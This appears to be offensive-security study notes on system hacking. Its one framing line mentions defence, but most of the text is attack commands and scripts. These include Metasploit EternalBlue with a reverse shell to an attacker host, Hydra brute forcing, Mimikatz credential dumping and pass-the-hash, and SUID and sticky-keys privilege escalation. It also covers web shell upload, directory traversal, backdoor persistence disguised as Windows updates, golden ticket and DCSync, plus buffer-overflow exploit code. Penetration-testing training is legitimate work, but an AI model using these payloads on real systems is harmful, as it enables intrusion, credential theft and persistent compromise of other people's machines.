# System Hacking - Topics Overview

## Topic Explanation
System Hacking involves gaining unauthorized access to computer systems by exploiting vulnerabilities in operating systems, applications, and services. This module covers various attack methods including password cracking techniques, privilege escalation, exploitation of services and applications, malicious software deployment, and maintaining persistent access. System hacking encompasses both technical attacks (brute force, hash injection, buffer overflow) and non-technical approaches (social engineering, physical access). The goal is to understand how attackers compromise systems to better defend against such attacks.

## Articles for Further Reference
- [OWASP Top 10 - Authentication and Session Management](https://owasp.org/www-project-top-ten/)
- [NIST Special Publication 800-63B: Authentication and Lifecycle Management](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [Microsoft Security Development Lifecycle](https://www.microsoft.com/en-us/securityengineering/sdl)
- [Buffer Overflow Prevention Techniques](https://en.wikipedia.org/wiki/Buffer_overflow_protection)
- [Privilege Escalation Attack Patterns](https://attack.mitre.org/tactics/TA0004/)

## Reference Links
- [Exploit Database](https://exploit-db.com/)
- [Metasploit Framework](https://www.metasploit.com/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [CVE Details](https://www.cvedetails.com/)
- [Security Focus BugTraq](https://www.securityfocus.com/bid)
- [SecLists - Password Lists](https://github.com/danielmiessler/SecLists)

## Available Tools for the Topic

### Tool Name: Metasploit Framework
**Description:** A comprehensive penetration testing platform that provides exploits, payloads, encoders, and post-exploitation modules for system compromise and privilege escalation.

**Example Usage:**
```bash
# Start Metasploit console
msfconsole

# Search for specific exploits
search ms17-010

# Use an exploit module
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target-ip
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attacker-ip
exploit
```

**Reference Links:**
- [Metasploit Documentation](https://docs.metasploit.com/)
- [Rapid7 Metasploit](https://www.rapid7.com/products/metasploit/)

### Tool Name: John the Ripper
**Description:** A fast password cracker that supports many hash types and attack modes including dictionary attacks, brute force, and hybrid attacks.

**Example Usage:**
```bash
# Basic password cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Brute force attack
john --incremental=Alpha hashes.txt

# Show cracked passwords
john --show hashes.txt

# Crack Windows NTLM hashes
john --format=NT hashes.txt
```

**Reference Links:**
- [John the Ripper Official Site](https://www.openwall.com/john/)

### Tool Name: Hashcat
**Description:** Advanced password recovery tool that supports GPU acceleration and hundreds of hash algorithms for high-speed password cracking.

**Example Usage:**
```bash
# Dictionary attack on NTLM hashes
hashcat -m 1000 -a 0 hashes.txt wordlist.txt

# Brute force attack
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# Rule-based attack
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
```

**Reference Links:**
- [Hashcat Official Site](https://hashcat.net/hashcat/)

### Tool Name: Hydra
**Description:** Network login cracker supporting various protocols for online password attacks against remote authentication services.

**Example Usage:**
```bash
# SSH brute force attack
hydra -l admin -P passwords.txt ssh://target-ip

# HTTP form brute force
hydra -l admin -P passwords.txt target-ip http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://target-ip
```

**Reference Links:**
- [THC Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)

### Tool Name: Mimikatz
**Description:** Windows credential extraction tool that can extract plaintext passwords, hashes, and Kerberos tickets from memory.

**Example Usage:**
```powershell
# Extract plaintext credentials from memory
sekurlsa::logonpasswords

# Extract NTLM hashes
sekurlsa::msv

# Extract Kerberos tickets
sekurlsa::tickets

# Pass-the-hash attack
sekurlsa::pth /user:admin /domain:domain.com /ntlm:hash
```

**Reference Links:**
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)

### Tool Name: Empire/PowerShell Empire
**Description:** Post-exploitation framework that provides PowerShell and Python agents for persistent access and lateral movement.

**Example Usage:**
```bash
# Start Empire
sudo ./empire

# Create listener
listeners
uselistener http
set Host attacker-ip
execute

# Generate stager
usestager windows/launcher_bat
set Listener http
execute
```

**Reference Links:**
- [PowerShell Empire GitHub](https://github.com/EmpireProject/Empire)

## All Possible Payloads for Manual Approach

### Password Attack Payloads
```
# Common default credentials
admin:admin
administrator:password
root:root
admin:password
guest:guest
user:user
test:test
sa:sa (SQL Server)
oracle:oracle
postgres:postgres

# Common password patterns
password123
Password1
company2024
admin2024
Welcome1
P@ssw0rd
123456
password
qwerty
letmein

# Wordlist generation patterns
[company_name][year]
[name][birth_year]
[common_word][numbers]
[season][year]
```

### Hash Injection Payloads
```
# Windows SAM hash formats
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Linux shadow file formats
root:$6$salt$hash:18000:0:99999:7:::
user:$6$salt$hash:18000:0:99999:7:::

# Pass-the-hash attack vectors
pth-winexe -U domain/user%aad3b435b51404ee:hash //target-ip cmd.exe
python psexec.py domain/user@target-ip -hashes aad3b435b51404ee:hash
```

### Buffer Overflow Payloads
```python
# Basic buffer overflow pattern
payload = "A" * offset + "B" * 4 + "C" * 100

# Shellcode injection
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
nop_sled = "\x90" * 100
payload = nop_sled + shellcode + "A" * (offset - len(nop_sled) - len(shellcode)) + struct.pack("<I", return_address)

# Windows reverse shell payload
msfvenom -p windows/shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f python
```

### Privilege Escalation Payloads
```bash
# Linux privilege escalation checks
sudo -l
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
cat /etc/passwd
cat /etc/shadow
cat /etc/sudoers
ps aux
netstat -antup
ls -la /home/
crontab -l

# Windows privilege escalation
whoami /priv
whoami /groups
net user
net localgroup administrators
systeminfo
tasklist /svc
netstat -an
schtasks /query
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

### Service Exploitation Payloads
```bash
# SMB exploitation
smbclient -L //target-ip
smbmap -H target-ip
enum4linux target-ip
rpcclient -U "" target-ip

# Web service exploitation
nikto -h http://target-ip
dirb http://target-ip
gobuster dir -u http://target-ip -w /usr/share/wordlists/dirb/common.txt
sqlmap -u "http://target-ip/page.php?id=1" --dbs

# Database exploitation
mysql -h target-ip -u root -p
psql -h target-ip -U postgres
sqlcmd -S target-ip -U sa
```

## Example Payloads

### 1. Windows Password Bypass Technique
```batch
REM Boot from Windows PE or Linux live USB
REM Access system partition (usually C:)
cd Windows\System32
ren osk.exe osk.exe.bak
copy cmd.exe osk.exe
REM Reboot to Windows login screen
REM Press Windows + U to open accessibility options
REM Click on-screen keyboard to get command prompt
net user administrator /active:yes
net user administrator newpassword
net localgroup administrators newuser /add
```

### 2. Linux Root Access via SUID Exploitation
```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Exploit common SUID binaries
# If /bin/cp has SUID bit:
echo 'user::0:0:root:/root:/bin/bash' > /tmp/passwd
/bin/cp /tmp/passwd /etc/passwd
su user

# If /usr/bin/find has SUID bit:
/usr/bin/find . -exec /bin/bash -p \; -quit

# If /usr/bin/vim has SUID bit:
/usr/bin/vim -c ':!/bin/bash'
```

### 3. Memory-based Credential Extraction
```powershell
# Using Mimikatz for credential extraction
privilege::debug
sekurlsa::logonpasswords full
sekurlsa::wdigest
sekurlsa::msv
sekurlsa::kerberos
sekurlsa::tspkg
lsadump::sam
lsadump::secrets
lsadump::cache

# PowerShell alternative methods
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
$context.ValidateCredentials("username", "password")
```

### 4. Network Service Exploitation
```python
#!/usr/bin/env python3
# SMB exploitation example
import socket
import struct

target_ip = "192.168.1.100"
target_port = 445

# EternalBlue exploit payload
payload = b"\x00\x00\x00\x54" + b"A" * 84

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(payload)
    response = s.recv(1024)
    print(f"Response: {response}")
    s.close()
except Exception as e:
    print(f"Error: {e}")
```

### 5. Web Application System Compromise
```bash
#!/bin/bash
# Web shell deployment and system access
TARGET="http://target-site.com"

# File upload vulnerability exploitation
curl -X POST -F "file=@webshell.php" $TARGET/upload.php
curl $TARGET/uploads/webshell.php?cmd=whoami

# SQL injection to system command execution
sqlmap -u "$TARGET/page.php?id=1" --os-shell --batch

# Directory traversal to sensitive file access
curl "$TARGET/page.php?file=../../../etc/passwd"
curl "$TARGET/page.php?file=../../../windows/system32/drivers/etc/hosts"
```

### 6. Post-Exploitation Persistence
```powershell
# Windows persistence techniques
# Registry run key persistence
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# Scheduled task persistence
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc daily /st 09:00

# Service persistence
sc create "WindowsSecurityService" binpath= "C:\Windows\Temp\backdoor.exe" start= auto
sc start "WindowsSecurityService"

# WMI event subscription
wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="ProcessFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2"
```

### 7. Buffer Overflow Exploitation Framework
```python
#!/usr/bin/env python3
import socket
import struct

# Target service details
target_ip = "192.168.1.100"
target_port = 9999

# Buffer overflow parameters
offset = 1978
return_address = 0x625011af  # JMP ESP address
nop_sled = b"\x90" * 16

# Shellcode (reverse shell)
shellcode = (
    b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    # ... complete shellcode here
)

# Craft exploit payload
buffer = b"A" * offset
buffer += struct.pack("<I", return_address)
buffer += nop_sled
buffer += shellcode

# Send exploit
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(buffer)
    s.close()
    print("Exploit sent successfully")
except Exception as e:
    print(f"Error: {e}")
```

### 8. Active Directory Compromise
```powershell
# Kerberoasting attack
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }

# AS-REP roasting
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

# Golden ticket attack (after domain admin compromise)
mimikatz "kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi"

# DCSync attack
mimikatz "lsadump::dcsync /domain:domain.com /user:krbtgt"
```